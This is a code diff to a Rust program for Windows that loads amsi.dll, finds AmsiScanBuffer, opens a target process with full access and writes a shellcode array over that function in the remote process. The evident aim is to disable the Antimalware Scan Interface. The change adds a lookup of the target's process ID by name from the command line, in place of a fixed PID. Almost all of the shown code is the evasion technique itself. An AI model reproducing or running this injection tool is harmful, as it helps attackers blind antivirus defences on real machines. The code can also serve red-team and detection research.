@@ -1,4 +1,5 @@
 use std::ffi::c_void;
+use sysinfo::System;
 use windows::{
     core::s,
     Win32::{
@@ -35,10 +36,14 @@ const SHELLCODE: [u8; 106] = [
 ];
 
 fn main() {
+    let args: Vec<String> = std::env::args().collect();
+    let process_name = &args[1];
+    let pid = find_process(process_name).expect("[!] Failed to find the PID of the target process");
+
     let h_module = unsafe { LoadLibraryA(s!("amsi.dll")).expect("[!] LoadLibrary Failed With Status") };
     let address = unsafe { GetProcAddress(h_module, s!("AmsiScanBuffer")) };
     let func_address = unsafe { std::mem::transmute::<_, *mut c_void>(address) };
-    let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, 30556).expect("[!] OpenProcess Failed With Status") };
+    let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid).expect("[!] OpenProcess Failed With Status") };
     
     println!("[+] Function: AmsiScanBuffer | Address: {:?}", func_address);
 
@@ -149,4 +154,17 @@ fn write_shellcode(h_process: HANDLE, address: *mut c_void) {
             &mut old_protect
         ).expect("[!] VirtualProtectEx (3) Failed With Status");
     }   
+}
+
+fn find_process(process_name: &str) -> Result<u32, ()> {
+    let mut system = System::new_all();
+    system.refresh_all();
+
+    for (pid, process) in system.processes() {
+        if process.name() == process_name {
+            return Ok(pid.as_u32());
+        }
+    }
+
+    Err(())
 }
